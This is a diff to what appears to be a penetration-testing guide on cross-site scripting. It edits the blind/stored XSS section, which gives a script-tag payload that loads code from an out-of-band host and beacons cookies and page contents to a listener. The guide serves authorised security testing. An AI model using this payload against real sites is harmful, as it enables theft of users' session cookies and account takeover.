@@ -43,9 +43,9 @@ Weaknesses that make XSS exploitable: `unsafe-inline`, `unsafe-eval`, `unsafe-ha
 ## 5. Blind / stored XSS (fires elsewhere, e.g. an admin view)
 Use an out-of-band collector so you learn when it executes:
 ```
-"><script src=https://OOB_ID.xss.report></script>
+"><script src=https://OOB_HOST></script>
 ```
-Payload beacons back DOM/cookies to your XSS Hunter / interactsh listener. Record the callback URL you used in `evidence/`.
+Payload beacons back DOM/cookies to `OOB_HOST`, a listener you control (self-hosted XSS Hunter or interactsh) — a hosted catcher would receive the victim's cookies too. Record the callback URL you used in `evidence/`.
 
 ## Confirm vs false positive (calibrate, don't discard)
 - Reflection ≠ execution. Prove the JS **runs** (callback fires, `document.domain` shown, DOM changes) in the right context before `status=confirmed`.
